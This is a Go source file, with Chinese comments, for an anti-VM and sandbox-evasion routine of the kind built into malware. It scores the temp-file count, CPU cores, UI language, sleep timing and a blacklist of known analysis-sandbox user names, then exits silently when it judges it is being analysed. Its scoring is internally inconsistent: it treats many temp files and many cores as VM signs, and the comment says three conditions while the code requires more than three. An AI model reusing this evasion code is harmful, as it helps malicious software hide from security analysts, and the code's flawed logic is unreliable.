package tools

import (
	"golang.org/x/sys/windows"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// temp文件 check
func numberOfTempFiles() (bool, error) {
	conn := os.Getenv("temp") // 通过环境变量读取temp文件夹路径
	var k int
	if conn == "" {

		return false, nil
	} else {
		local_dir := conn
		err := filepath.Walk(local_dir, func(filename string, fi os.FileInfo, err error) error {
			if fi.IsDir() {
				return nil
			}
			k++

			return nil
		})
		//fmt.Println("Temp总共文件数量:", k)
		if err != nil {
			// fmt.Println("路径获取错误")
			return false, nil
		}
	}
	if k < 30 {
		return false, nil
	}
	return true, nil

}

// cpu
func numberOfCPU() (bool, error) {
	a := runtime.NumCPU()
	//fmt.Println("CPU核心数为:", a)
	if a < 4 {
		return false, nil // 小于4核心数,返回0
	} else {
		return true, nil // 大于4核心数，返回1
	}
}

// 语言
func check_language() (bool, error) {
	a, _ := windows.GetUserPreferredUILanguages(windows.MUI_LANGUAGE_NAME)
	if a[0] != "zh-CN" {
		return true, nil
	}
	return false, nil
}

// 时间加速
func isTimeAccelerated() (bool, error) {
	start := time.Now()
	time.Sleep(5 * time.Second)
	end := time.Now()
	duration := end.Sub(start).Milliseconds()
	if duration < 5000 {
		return true, nil
	}
	return false, nil
}

// 检查用户名
func checkUsernames() (bool, error) {
	// 获取当前用户名
	user, err := user.Current()
	if err != nil {
		//fmt.Println("获取用户名失败:", err)
		return false, nil
	}
	currentUsername := user.Username

	// 黑名单用户名列表
	blacklist := []string{
		"CurrentUser", "Sandbox", "Emily", "HAPUBWS", "Hong Lee", "IT-ADMIN", "Johnson",
		"Miller", "milozs", "Peter Wilson", "timmy", "user", "sand box", "malware",
		"maltest", "test user", "virus", "John Doe", "Sangfor", "JOHN-PC",
	}

	// 进行大小写不敏感的比较
	for _, knownUsername := range blacklist {
		if strings.EqualFold(currentUsername, knownUsername) {
			return true, nil
		}
	}
	return false, nil
}

// 如果有三个条件都符合虚拟机 则不执行
func AntiVM() bool {
	trueCount := 0
	functions := []func() (bool, error){numberOfTempFiles, numberOfCPU, check_language, isTimeAccelerated, checkUsernames}
	for _, f := range functions {
		result, err := f()
		if err != nil {
			//fmt.Printf("执行函数 %v 出现错误: %v\n", f, err)
			continue
		}
		if result {
			trueCount++
		}
	}

	if trueCount > 3 {
		//fmt.println("虚拟机 已退出")
		os.Exit(0)
	}
	return true
}
